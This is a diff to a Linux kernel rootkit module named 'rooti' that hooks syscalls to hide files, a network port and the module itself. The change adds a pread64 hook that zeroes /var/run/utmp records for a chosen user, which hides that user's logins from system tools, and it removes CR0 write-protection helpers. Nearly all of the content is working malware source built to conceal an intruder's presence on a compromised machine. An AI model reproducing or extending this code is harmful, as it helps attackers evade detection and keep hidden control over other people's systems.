@@ -10,6 +10,7 @@
 #include <net/sock.h>
 #include <net/tcp.h>
 #include "hooking.c"
+#include "utmp.h"
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Omri Ben Zikri");
@@ -18,6 +19,9 @@ MODULE_VERSION("1.0.0");
 
 // Prefix of files that we wish to hide
 #define ROOTI_HIDE_PREFIX "secret"
+
+// User to hide
+#define ROOTI_HIDE_USER "omri"
 
 // Port number to hide from tools like netstat
 #define ROOTI_HIDE_PORT 8080
@@ -57,6 +61,9 @@ static LIST_HEAD(rooti_random_tamper_fds);
 // List of /proc directory FDs opened by userspace processes
 static LIST_HEAD(rooti_proc_tamper_fds);
 
+// List of FDs of /var/run/utmp opened by userspace processes
+static LIST_HEAD(rooti_utmp_tamper_fds);
+
 /* Indicates whether the rootkit is missing from the list of kernel modules (e.g is hidden).
  * When hidden, the variable rooti_prev_module stores the address of the node that was previous
  * before this module in the list, otherwise it is NULL;
@@ -70,6 +77,7 @@ static asmlinkage long (*rooti_orig_openat)(const struct pt_regs *regs);
 static asmlinkage long (*rooti_orig_close)(const struct pt_regs *regs);
 static asmlinkage long (*rooti_orig_dup2)(const struct pt_regs *regs);
 static asmlinkage long (*rooti_orig_read)(const struct pt_regs *regs);
+static asmlinkage long (*rooti_orig_pread64)(const struct pt_regs *regs);
 static asmlinkage long (*rooti_orig_getdents64)(const struct pt_regs *regs);
 
 static int (*rooti_orig_tcp4_seq_show)(struct seq_file *seq, void *v);
@@ -212,6 +220,26 @@ static asmlinkage long rooti_hook_openat(const struct pt_regs *regs)
         kfree(filepath_kernel);
         return fd;
     }
+    else if (strncmp(filepath_kernel, "/var/run/utmp", NAME_MAX) == 0) {
+        pid_t pid = current->pid;
+        int fd = rooti_orig_openat(regs);
+
+        // Allocate a new record of an open fd
+        tamper_fd = kmalloc(sizeof(*tamper_fd), GFP_KERNEL);
+        if (tamper_fd == NULL) {
+            printk(KERN_DEBUG "rooti: failed to allocate memory\n");
+            return fd;
+        }
+        tamper_fd->pid = pid;
+        tamper_fd->fd = fd;
+
+        // Append the new record
+        INIT_LIST_HEAD(&tamper_fd->head);
+        list_add_tail(&tamper_fd->head, &rooti_utmp_tamper_fds);
+
+        kfree(filepath_kernel);
+        return fd; 
+    }
 
     kfree(filepath_kernel);
     return rooti_orig_openat(regs);
@@ -231,6 +259,12 @@ static asmlinkage long rooti_hook_close(const struct pt_regs *regs)
         }
     }
     list_for_each_entry_safe(record, tmp, &rooti_proc_tamper_fds, head) {
+        if (pid == record->pid && fd == record->fd) {
+            list_del(&record->head);
+            kfree(record);
+        }
+    }
+    list_for_each_entry_safe(record, tmp, &rooti_utmp_tamper_fds, head) {
         if (pid == record->pid && fd == record->fd) {
             list_del(&record->head);
             kfree(record);
@@ -279,7 +313,21 @@ static asmlinkage long rooti_hook_dup2(const struct pt_regs *regs)
             list_add_tail(&new->head, &rooti_proc_tamper_fds);
         }
     }
+    list_for_each_entry_safe(record, tmp, &rooti_utmp_tamper_fds, head) {
+        if (pid == record->pid && oldfd == record->fd) {
+            // Append new record for duplicated FD
+            new = kmalloc(sizeof(*new), GFP_KERNEL);
+            if (new == NULL) {
+                printk(KERN_DEBUG "rooti: failed to allocate memory\n");
+                return newfd;
+            }
+            new->pid = pid;
+            new->fd = newfd; 
 
+            INIT_LIST_HEAD(&new->head);
+            list_add_tail(&new->head, &rooti_utmp_tamper_fds);
+        }
+    }
     return newfd;
 }
 
@@ -306,6 +354,50 @@ static asmlinkage long rooti_hook_read(const struct pt_regs *regs)
                 printk(KERN_DEBUG "rooti: copy_to_user() failed\n");
                 kfree(kernel_buf);
                 return nread;
+            }
+            kfree(kernel_buf);
+        }
+    }
+    return nread;
+}
+
+static asmlinkage long rooti_hook_pread64(const struct pt_regs *regs) {
+    pid_t pid = current->pid;
+    int fd = regs->di;
+    size_t count = regs->dx;
+    char *user_buf = (char *)regs->si;
+    char *kernel_buf = NULL;
+    struct utmp *utmp_buf = NULL;
+    int err;
+
+    // Invoke the original syscall
+    size_t nread = rooti_orig_pread64(regs);
+
+    struct rooti_tamper_fd *record;
+    list_for_each_entry(record, &rooti_utmp_tamper_fds, head)  {
+        if (pid == record->pid && fd == record->fd) {
+            kernel_buf = kmalloc(count, GFP_KERNEL);
+            if (kernel_buf == NULL) {
+                printk(KERN_DEBUG "rooti: failed to allocate memory\n");
+                return nread;
+            }
+            err = copy_from_user(kernel_buf, user_buf, count);
+            if (err > 0) {
+                printk(KERN_DEBUG "rooti: copy_from_user() failed\n");
+                kfree(kernel_buf);
+                return nread;
+            }
+
+            utmp_buf = (struct utmp *)kernel_buf;
+            if (strncmp(utmp_buf->ut_user, ROOTI_HIDE_USER, UT_NAMESIZE) == 0) {
+                // Match found, fill the buffer with zeros, marking it as invalid
+                memset(kernel_buf, 0, count);
+                err = copy_to_user(user_buf, kernel_buf, count);
+                if (err > 0) {
+                    printk(KERN_DEBUG "rooti: copy_to_user() failed\n");
+                    kfree(kernel_buf);
+                    return nread;
+                }
             }
             kfree(kernel_buf);
         }
@@ -406,27 +498,9 @@ struct rooti_syscall_hook hooks[] = {
     ROOTI_HOOK("sys_close", rooti_hook_close, &rooti_orig_close),
     ROOTI_HOOK("sys_dup2", rooti_hook_dup2, &rooti_orig_dup2),
     ROOTI_HOOK("sys_read", rooti_hook_read, &rooti_orig_read),
+    ROOTI_HOOK("sys_pread64", rooti_hook_pread64, &rooti_orig_pread64),
     ROOTI_HOOK("sys_getdents64", rooti_hook_getdents64, &rooti_orig_getdents64)
 };
-
-static inline void rooti_force_write_cr0(unsigned long val)
-{
-    unsigned long __force_order;
-    asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
-}
-
-/* Disable the write protcetion by clearing the 16th bit of the CR0 register */
-static inline void rooti_unprotect_memory(void)
-{
-    rooti_force_write_cr0(read_cr0() & (~0x10000));
-}
-
-/* Enable the write protection by setting the 16th bit of the CR0 register */
-static inline void rooti_protect_memory(void)
-{
-    rooti_force_write_cr0(read_cr0() | (0x10000));
-}
-
 
 /* LKM initialization */
 static int __init rooti_init(void)
@@ -471,6 +545,10 @@ static void __exit rooti_exit(void)
         kfree(record);
     }
     list_for_each_entry_safe(record, tmp, &rooti_proc_tamper_fds, head) {
+        list_del(&record->head);
+        kfree(record);
+    }
+    list_for_each_entry_safe(record, tmp, &rooti_utmp_tamper_fds, head) {
         list_del(&record->head);
         kfree(record);
     }
